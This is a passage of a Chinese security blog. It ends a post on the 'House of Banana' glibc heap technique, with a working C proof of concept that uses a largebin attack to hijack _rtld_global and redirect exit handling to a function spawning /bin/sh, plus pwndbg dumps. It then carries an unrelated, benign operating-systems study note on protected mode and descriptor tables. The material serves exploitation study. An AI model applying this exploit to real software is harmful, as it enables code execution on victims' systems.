class="number">0x55555555bd00</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x55555555bd08</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55555555bd10</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x55555555bd18</span> —▸ <span class="number">0x55555555bd28</span> —▸ <span class="number">0x5555555552c9</span> (shell) ◂— endbr64 </span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x55555555bd20</span> ◂— <span class="number">0x8</span> <span class="comment">/* fake+0x50 */</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x55555555bd28</span> —▸ <span class="number">0x5555555552c9</span> (shell) ◂— endbr64 <span class="comment">/* fake+0x58 */</span></span><br></pre></td></tr></table></figure>
<p>案例二：直接利用“rtld_global”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;you hacked me!!&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;house of banana&#x27;s poc&quot;</span>);</span><br><span class="line">   <span class="keyword">size_t</span> libc_base = &amp;<span class="built_in">puts</span> - <span class="number">554128</span>;</span><br><span class="line">   <span class="keyword">size_t</span> _rtld_global_ptr_addr = libc_base + <span class="number">2252896</span>;</span><br><span class="line">   <span class="keyword">char</span> *ptr0 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line">   <span class="keyword">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="keyword">char</span> *ptr1 = <span class="built_in">malloc</span>(<span class="number">0x440</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="keyword">char</span> *ptr2 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;libc_base is 0x%lx\n&quot;</span>,libc_base);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;_rtld_global_ptr_addr is 0x%lx\n&quot;</span>,_rtld_global_ptr_addr);</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">free</span>(ptr0);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//put ptr0 into large bin</span></span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">free</span>(ptr1); <span class="comment">//free ptr1 into unsorted bin</span></span><br><span class="line">   <span class="built_in">free</span>(ptr2); <span class="comment">//free ptr2 into unsorted bin</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//bk_nextsize = _rtld_global_ptr_addr</span></span><br><span class="line">   *(<span class="keyword">size_t</span> *)(ptr0 + <span class="number">0x18</span>) = _rtld_global_ptr_addr - <span class="number">0x20</span>;</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x410</span>); <span class="comment">//large bin attack to hijack _rtld_global_ptr</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment">//fake a _rtld_global</span></span><br><span class="line">   <span class="keyword">size_t</span> fake_rtld_global_addr = ptr1 - <span class="number">0x10</span>;</span><br><span class="line">   <span class="keyword">size_t</span> *fake_rtld_global = (<span class="keyword">size_t</span> *)ptr1;</span><br><span class="line">   <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//the chain&#x27;s length must &gt;= 4</span></span><br><span class="line">   fake_rtld_global[<span class="number">1</span>] = &amp;fake_rtld_global[<span class="number">2</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">3</span>] = fake_rtld_global_addr;</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">2</span>+<span class="number">3</span>] = &amp;fake_rtld_global[<span class="number">3</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">2</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">3</span>+<span class="number">3</span>] = &amp;fake_rtld_global[<span class="number">8</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">3</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">8</span>+<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">   fake_rtld_global[<span class="number">8</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">//fake a fini_array segment</span></span><br><span class="line">   fake_rtld_global[<span class="number">0x20</span>] = &amp;fake_rtld_global[<span class="number">0x30</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">0x22</span>] = &amp;fake_rtld_global[<span class="number">0x23</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">0x23</span>+<span class="number">1</span>] = <span class="number">0x8</span>; <span class="comment">//func ptrs total len</span></span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">0x30</span>] = <span class="number">0x1A</span>;</span><br><span class="line">   fake_rtld_global[<span class="number">0x31</span>] = <span class="number">0</span>;</span><br><span class="line">   fake_rtld_global[<span class="number">-2</span>] = &amp;fake_rtld_global[<span class="number">0x32</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">//funcs</span></span><br><span class="line">   fake_rtld_global[<span class="number">0x32</span>] = backdoor;</span><br><span class="line">   fake_rtld_global[<span class="number">0x61</span>] = <span class="number">0x800000000</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种类型的 House Of Banana 直接攻击“rtld_global”，利用 largebin attack 在“rtld_global”中写入“fake_rtld_global_addr”（“fake_rtld_global” - 0x10）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_rtld_global</span><br><span class="line">$<span class="number">5</span> = (struct rtld_global *) <span class="number">0x7ffff7ffd060</span> &lt;_rtld_global&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/xg <span class="number">0x7ffff7ffd060</span></span><br><span class="line"><span class="number">0x7ffff7ffd060</span> &lt;_rtld_global&gt;:	<span class="number">0x000055555555ab20</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p fake_rtld_global</span><br><span class="line">$<span class="number">10</span> = (<span class="keyword">size_t</span> *) <span class="number">0x55555555ab30</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;fake_rtld_global_addr</span><br><span class="line">$<span class="number">12</span> = (<span class="keyword">size_t</span> *) <span class="number">0x7fffffffde20</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x000055555555ab20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555555ab20</span> —▸ <span class="number">0x55555555acc0</span> —▸ <span class="number">0x5555555551f9</span> (backdoor) ◂— endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555555ab28</span> ◂— <span class="number">0x451</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55555555ab30</span> —▸ <span class="number">0x7ffff7fc1fe0</span> (main_arena+<span class="number">1120</span>) —▸ <span class="number">0x7ffff7fc1fd0</span> (main_arena+<span class="number">1104</span>) —▸ <span class="number">0x7ffff7fc1fc0</span> (main_arena+<span class="number">1088</span>) —▸ <span class="number">0x7ffff7fc1fb0</span> (main_arena+<span class="number">1072</span>) ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55555555ab38</span> —▸ <span class="number">0x55555555ab40</span> —▸ <span class="number">0x55555555a6a0</span> ◂— <span class="number">0x0</span> </span><br><span class="line">    <span class="comment">/* fake_rtld_global[1] */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55555555ab40</span> —▸ <span class="number">0x55555555a6a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">    <span class="comment">/* fake_rtld_global[2] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55555555ab48</span> —▸ <span class="number">0x55555555ab20</span> —▸ <span class="number">0x55555555acc0</span> —▸ <span class="number">0x5555555551f9</span> (backdoor) ◂— endbr64 </span><br><span class="line">    <span class="comment">/* fake_rtld_global[3] */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55555555ab50</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55555555ab58</span> —▸ <span class="number">0x55555555ab48</span> —▸ <span class="number">0x55555555ab20</span> —▸ <span class="number">0x55555555acc0</span> —▸ <span class="number">0x5555555551f9</span> (backdoor) </span><br></pre></td></tr></table></figure>
<p>利用条件：</p>
<ul>
<li>有足够的空间，可以伪造“rtld_global”结构体</li>
<li>可以使用 Largebin attack</li>
</ul>
<h2 id="版本对-House-Of-Banana-的影响"><a href="#版本对-House-Of-Banana-的影响" class="headerlink" title="版本对 House Of Banana 的影响"></a>版本对 House Of Banana 的影响</h2><p>目前为止没有影响</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/" class="post-title-link" itemprop="url">操作系统真象还原（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-09 17:23:24" itemprop="dateCreated datePublished" datetime="2022-04-09T17:23:24+08:00">2022-04-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-17 15:06:56" itemprop="dateModified" datetime="2022-04-17T15:06:56+08:00">2022-04-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="陷入内核"><a href="#陷入内核" class="headerlink" title="陷入内核"></a>陷入内核</h2><img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649158216559-1650179214572.png" class width="1649158216559"> 
<p>如果把软件分层的话， 最外圈是应用程序，里面是操作系统，应用程序处于特权级 3（ring 3），操作系统内核处于特权级 0（ring 0），当用户程序欲访问系统资源时（无论是硬件，还是内核数据结构），它需要进行系统调用，这样 CPU 便进入了内核态，也称看图中凹下去的部分，是不是有陆进去的感觉，这就是“陷入内核” </p>
<h2 id="实模式（20位）"><a href="#实模式（20位）" class="headerlink" title="实模式（20位）"></a>实模式（20位）</h2><p>实模式出现于早期8088CPU时期，当时由于CPU的性能有限，一共只有20位地址线（所以地址空间只有1MB），以及8个16位的通用寄存器，以及4个16位的段寄存器，所以为了能够通过这些16位的寄存器去构成20位的主存地址，必须采取一种特殊的方式，当某个指令想要访问某个内存地址时，它通常需要用下面的这种格式来表示： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(段基址：段偏移量)</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个字段是段基址：它的值是由 <strong>段寄存器</strong> 提供的(一般来说，段寄存器有6种，分别为cs，ds，ss，es，fs，gs，这几种段寄存器都有自己的特殊意义)</li>
<li>第二字段是段内偏移量：代表你要访问的这个内存地址距离这个段基址的偏移它的值就是由通用寄存器来提供的，所以也是16位</li>
<li>那么两个16位的值如何组合成一个20位的地址呢？CPU采用的方式是把段寄存器所提供的段基址先向左移4位，这样就变成了一个20位的值，然后再与段偏移量相加</li>
</ul>
<h2 id="保护模式-（32位）"><a href="#保护模式-（32位）" class="headerlink" title="保护模式 （32位）"></a>保护模式 （32位）</h2><p>随着CPU的发展，CPU的地址线的个数也从原来的20根变为现在的32根，所以可以访问的内存空间也从1MB变为现在4GB，寄存器的位数也变为32位，所以实模式下的内存地址计算方式就已经不再适合了，所以就引入了现在的保护模式，实现更大空间的，更灵活也更安全的内存访问</p>
<p>我们的偏移值和实模式下是一样的，就是变成了32位而已，而段值仍旧是存放在原来16位的段寄存器中， <strong>但是这些段寄存器存放的却不再是段基址了</strong> ，毕竟之前说过实模式下寻址方式不安全，我们在保护模式下需要加一些限制，而这些限制可不是一个寄存器能够容纳的，于是我们把这些关于内存段的限制信息放在一个叫做 <strong>全局描述符表(GDT)</strong> 的结构里</p>
<p><strong>保护模式 VS 实模式</strong></p>
<ul>
<li>实模式的不足<ul>
<li>实模式下操作系统和用户程序属于同一特权级，没有区别对待</li>
<li>用户程序所引用的地址都是指向真实的物理地址，也就是说逻辑地址等于物理地址，实实在在地 指哪打哪</li>
<li>用户程序可以自由修改段基址，可以不亦乐乎地访问所有内存，没人拦得住 </li>
<li>访问超过 64KB 的内存区域时要切换段基址，转来转去容易晕乎</li>
<li>一次只能运行一个程序，无法充分利用计算机资源</li>
<li>共 20 条地址线，最大可用内存为1MB ，这即使在 20 年前也不够用</li>
</ul>
</li>
<li>保护模式的优越<ul>
<li>建立了全局描述符表（GDT），用于存储寄存器存不下的信息<ul>
<li>实模式中直接把偏移地址写在段寄存器上</li>
<li>保护模式则存储在GDT中并添加了许多“约束条件”，而寄存器中则写入段选择子用于索引对应的段信息</li>
</ul>
</li>
<li>寻址方式扩展<ul>
<li>实模式下对于内存寻址来说：“基址寻址、变址寻址、基址变址寻址”这三种形式中的基址寄存器只能是 “bx，bp”，变址寄存器只能是 “si，di”，也就是说，只能用这4个寄存器</li>
<li>总之实模式下的寄存器有固定的使命，对于寻址来说，若想用其他的寄存器，甭说 CPU 报不报错，就连编译这关都过不了</li>
<li>在保护模式下，这一切都不同了，同样是在内存寻址中，基址寄存器不再只是 “bx，bp”，而是所有 32 位的通用寄存器，变址寄存器也是一样，不再只是 “si，di”，而是除 esp 之外的所有 32 通用寄存器</li>
</ul>
</li>
<li>指令扩展 <ul>
<li>在16位的实模式下， CPU 的操作数是16位，在32位的保护模式下，操作数扩展到了32位，于是涉及到操作数变化的指令也要跟着扩展，既要兼容16位的操作数，也要支持32位的操作数 </li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>保护模式的开关</strong></p>
<p>控制寄存器 CRx 系列是 CPU 的窗口，既可以用来展示 CPU 的内部状态，也可用于控制 CPU 的运行机制，进入保护模式，关键就是 CR0 的PE字段</p>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649696453838.png" class width="1649696453838"> 
<ul>
<li>PE=0 表示在实模式下运行</li>
<li>PE=1 表示在保护模式下运行</li>
</ul>
<p><strong>保护模式的保护机制</strong></p>
<ul>
<li>向段寄存器加载选择子时的保护：<ul>
<li>当引用一个内存段时，实际上就是往段寄存器中加载个选择子，为了避免出现非法引用内存段的情况， 在这时候，处理器会在以下几方面做出检查：</li>
<li>验证段描述符是否超越界限<ul>
<li>保护内容：<ul>
<li>选择子的索引值一定要小于等于描述符表（GOT LDT）中描述符的个数</li>
</ul>
</li>
<li>保护实现：<ul>
<li>处理器先检查 TI 的值<ul>
<li>如果 TI=0，则从全局描述符表寄存器 gdtr 中拿到 GOT 基地址和 GOT 界限值</li>
<li>如果 TI=1，则从局部描述符表寄存器 ldtr 中拿到 LDT 基地址和 LDT 界限值</li>
</ul>
</li>
<li>然后把“选择子的高13位”代入以下的表达式<ul>
<li>描述符表基地址+选择子中的索引值*8+7 &lt;= 描述符表基址+标识符表界限值</li>
<li>若不成立，处理器则抛出异常 </li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>代码段和数据段的保护<ul>
<li>保护内容：<ul>
<li>对于代码段和数据段来说，CPU 每访问一个地址，都要确认该地址不能超过其所在内存段的范围</li>
</ul>
</li>
</ul>
</li>
<li>栈段的保护</li>
</ul>
</li>
</ul>
<h2 id="全局描述符表"><a href="#全局描述符表" class="headerlink" title="全局描述符表"></a>全局描述符表</h2><p>全局描述符表中含有一个个表项，每一个表项称为 <strong>段描述符</strong> ，而段寄存器在保护模式下存放的便是相当于一个数组索引的东西，通过这个索引，可以找到对应的表项，段描述符存放了段基址、段界限、内存段类型属性(比如是数据段还是代码段，注意 <strong>一个段描述符只能用来定义一个内存段</strong>)等许多属性,具体信息见下图： </p>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649674596041.png" class width="1649674596041">   
<p>全局描述符表位于内存中，需要用专门的寄存器指向它后，CPU 才知道它在哪里，这个专门的寄存器便是 <strong>GDTR</strong> (一个48位的寄存器)，专门用来存储 GDT 的内存地址及大小</p>
<ul>
<li><strong>段界限</strong>：表示段边界的扩张最值，即最大扩展多少或最小扩展多少，用20位来表示，它的单位可以是字节，也可以是4KB，这是由G位决定的</li>
<li><strong>G位</strong>：G为0时表示单位为字节，G为1时表示单位为4KB</li>
<li><strong>段基址</strong>：真正的段基址（共分为3部分来存储）</li>
<li><strong>TYPE字段</strong>：用来指定本描述符的类型<ul>
<li>什么是系统段？各种称为“门”的结构便是系统段，也就是硬件系统需要的结构，非软件使用的调用门、任务门</li>
<li>简而言之，门的意思就是入口，它通往一段程序</li>
<li>TYPE字段共4位，用于表示内存段或门的子类型</li>
</ul>
</li>
<li><strong>S位</strong>：S为0时表示系统段，S为1时表示数据段）<ul>
<li>一个段描述符，在 CPU 眼里分为两大类，要么描述的是系统段，要么描述的是数据段 </li>
<li>凡是硬件运行需要用到的东西都可称之为系统</li>
<li>凡是软件需要的东西都称为数据，无论是代码，还是数据，甚至包括栈，它们都作为硬件的输入，都是给硬件的数据而己，所以代码段在段描述符中也属于数据段</li>
</ul>
</li>
<li><strong>DPL字段</strong>：Descriptor Privilege Level ，即描述符特权级<ul>
<li>这是保护模式提供的安全解决方案，将计算机世界按权力划分成不同等级，每一种等级称为一种特权级（分为 ring0 ~ ring3）</li>
<li>特权级是保护模式下才有的东西，CPU 由实模式进入保护模式后，特权级自动为0<ul>
<li>因为保护模式的代码已经是操作系统的一部分了，所以操作系统应该处于最高的0特权级</li>
<li>用户程序通常处于3特权级，权限最小</li>
<li>某些指令只能在0特权级下执行，从而保证了安全</li>
</ul>
</li>
</ul>
</li>
<li><strong>P位</strong>：Present，即段是否存在<ul>
<li>如果该段存在于内存中，则P为1，反之P为0</li>
<li>P位是由CPU来检查的，如果P为0，则CPU将会抛出异常然后跳转到对应的异常处理程序，然后把P改为1（这个异常处理程序是由开发人员来写的）</li>
</ul>
</li>
<li><strong>AVL位</strong>：从名字上看它是 AVaiLable，可用的<ul>
<li>不过这“可用的”是对用户来说的，也就是操作系统可以随意用此位，对硬件来说，它没有专门的用途</li>
</ul>
</li>
<li><strong>L位</strong>：用来设置是否是 64 位代码段<ul>
<li>L为1表示64位代码段，否则表示32位代码段</li>
</ul>
</li>
<li><strong>D/B位</strong>：用来指示有效地址（段内偏移地址）及操作数的大小<ul>
<li>对于代码段来说，此位是D位<ul>
<li>若D为0，表示指令中的有效地址和操作数是16位，指令有效地址用IP寄存器</li>
<li>若D为1，表示指令中的有效地址及操作数是32位，指令有效地址用EIP寄存器</li>
</ul>
</li>
<li>对于栈段来说，此位是B位，用来指定操作数大小（此操作数涉及到“对栈指针寄存器的选择”以及“栈的地址上限”）<ul>
<li>若B为0，使用的是sp寄存器，使用16位寄存器（最大寻址范围：0~0xFFFF）</li>
<li>若B为1，使用的是esp寄存器，使用32位寄存器（最大寻址范围：0~0xFFFFFFFF）</li>
</ul>
</li>
</ul>
</li>
<li><strong>段的选择子</strong>：（在段寄存器 CS、 DS、 ES、 FS、 GS、 SS 中）<ul>
<li>在实模式下时，段中存储的是段基地址，即内存段的起始地址</li>
<li>而在保护模式下时，由于段基址已经存入了段描述符中（各个段描述符组织为GDT表），所以段寄存器中再存放段基址是没有意义的，在段寄存器中存入的是一个叫作选择子的东西</li>
<li>选择子“基本上”是个索引值（虽然它还有其他内容，暂时忽略）， 就是 GDT 中的下标，段选择子的结构如下：</li>
</ul>
</li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649160006227-1650179214572.png" class width="1649160006227"> 
<ul>
<li>RPL：请求特权级别，通俗的讲我用什么权限来请求</li>
<li>TI：TI=0时，查GDT表，TI=1时，查LDT表</li>
<li>Index：处理器将索引值乘以8在加上GDT或者LDT的基地址，就是要加载的段描述符</li>
</ul>
<h2 id="局部描述符表"><a href="#局部描述符表" class="headerlink" title="局部描述符表"></a>局部描述符表</h2><p>CPU 厂商建议每个任务的私有内存段都应该放到自己的段描述符表中，该表就是局部描述符表（LDT），即每个任务都有自己的 LDT ，随着任务切换，也要切换相应任务的 LDT</p>
<ul>
<li>LDT 局部描述符表可以有若干张，每个任务可以有一张 </li>
<li>LDT 也位于内存中，其地址需要先被加载到某个寄存器后，CPU 才能使用 LDT，该寄存器是 LDTR（即 LDT Register）</li>
<li>LDT 跟 GDT 差不多，跳转的时候选择子的TI=0我们就用 GDT，如果TI=1我们就用 LDT<ul>
<li>TI=0时：CS:IP=全局描述符表中第 1(0x8&gt;&gt;3) 项描述符给出的段基址 +0 的偏移地址</li>
<li>TI=1时：CS:IP=局部描述符表中第 1(0x8&gt;&gt;3) 项描述符给出的段基址 +0 的偏移地址 </li>
</ul>
</li>
</ul>
<p>LDT 的使用步骤如下：</p>
<ul>
<li>定义一个局部描述符表 LDT</li>
<li>在 GDT 中定义一个描述符 Descriptor_LDT：<ul>
<li>其基地址用 LDT 的起始地址填充</li>
<li>描述符 Descriptor_LDT 的选择子为 SelectorLDT</li>
</ul>
</li>
<li>用 lldt 命令加载 lgtr</li>
<li>jmp时的选择子 TI=1 就可以了</li>
</ul>
<h2 id="物理地址，有效地址，虚拟地址"><a href="#物理地址，有效地址，虚拟地址" class="headerlink" title="物理地址，有效地址，虚拟地址"></a>物理地址，有效地址，虚拟地址</h2><ul>
<li>物理地址：<ul>
<li>就是物理内存真正的地址，相当于内存中每个存储单元的门牌号，具有唯一性</li>
<li>在实模式下，“段基址＋段内偏移地址”经过段部件的处理，直接输出的就是物理地址</li>
<li>物理地址＝块号＋页内地址</li>
</ul>
</li>
<li>有效地址（逻辑地址）：<ul>
<li>无论在实模式或是保护模式下，段内偏移地址又称为有效地址，也称为逻辑地址（这是程序员可见的地址）</li>
<li>逻辑地址＝页号＋页内地址</li>
</ul>
</li>
<li>虚拟地址（线性地址）：<ul>
<li>在保护模式下，“段基址＋段内偏移地址”称为线性地址，不过，此时的段基址已经不再是真正的地址，而是个被称为选择子的东西（它本质是个索引，类似于数组下标，通过这个索引便能在 GDT 中找到相应的段描述符）</li>
<li>若开启了分页功能，那么线性地址又多了个名字，就就是虚拟地址，虚拟地址要经过页部件转换成具体的物理地址，这样 CPU 才能将其送上地址总线去访问内存</li>
</ul>
</li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649160944655-1650179214572.png" class width="1649160944655"> 
<h2 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h2><img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649161146525-1650179214572.png" class width="1649161146525"> 
<h2 id="编译型语言-amp-解释型语言"><a href="#编译型语言-amp-解释型语言" class="headerlink" title="编译型语言&amp;解释型语言"></a>编译型语言&amp;解释型语言</h2><ul>
<li>解释型语言<ul>
<li>也称为脚本语言，如 JavaScript Python Perl PHP Shell 脚本等，它们本身是文本文件，是某个应用程序的输入，这个应用程序是脚本解释器</li>
<li>脚本中的代码从来没真正上过 CPU 去执行， CPU CS: ip 寄存器从来没指向过它们，在 CPU 眼里只看得到脚本解释器，而这些脚本中的代码， CPU 从来就不知道有它们的存在</li>
<li>这些脚本代码看似在按照开发人员的逻辑执行，本质上是脚本解释器在时时分析这个脚本，动态根据关键字和语法来做出相应的行为</li>
</ul>
</li>
<li>编译型语言<ul>
<li>编译型语言编译出来的程序运行时本身就是一个进程它是由操作系统直接调用的，也就是由操作系统加载到内存后，操作系统将 CS: IP 寄存器指向这个程序的入口，使它直接上 CPU 运行</li>
<li>总之调度器在就绪队列中能看到此进程，而解释型程序是无法让调度器“入眼”的，调度器只会看到该脚本语言的解释器</li>
</ul>
</li>
</ul>
